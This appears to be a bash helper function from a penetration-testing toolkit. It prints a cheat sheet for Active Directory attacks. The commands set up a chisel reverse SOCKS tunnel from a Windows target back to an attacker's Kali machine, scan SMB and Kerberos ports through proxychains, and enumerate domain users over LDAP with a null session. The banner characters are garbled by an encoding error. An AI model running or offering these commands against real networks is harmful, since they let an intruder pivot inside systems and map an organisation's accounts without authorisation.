helptunnel() {
  echo -e "${BOLD}${RED}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
  echo -e "${BOLD}${RED}   TUNNEL COMMANDS FOR AD${NC}"
  echo -e "${BOLD}${RED}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
  echo ""
  echo -e "${RED}On Kali Box: chmod +x chisel ${NC}"
  echo -e "${RED}On Kali Box: sudo ./chisel server -p 8001 --socks5 --reverse ${NC}"
  echo -e "${RED}On Kali Box: ./chisel server -p 8001 --socks5 --reverse ${NC}"
  echo -e "${RED}On Windows Box: chisel client <KALIP>:8001 R:socks - check x64 or x32 bit version${NC}"
  echo -e "${RED}On Kali Box: proxychains -q nmap -Pn -sT -p445,88,139 ${NC}"
  echo -e "${RED}On Kali Box: sudo proxychains bash ./ADScanner.sh [args] <Password> ${NC}"
  echo -e "${RED}On Kali Box: nxc ldap DC_IP -u '' -p '' --users ${NC}"
  echo ""
}

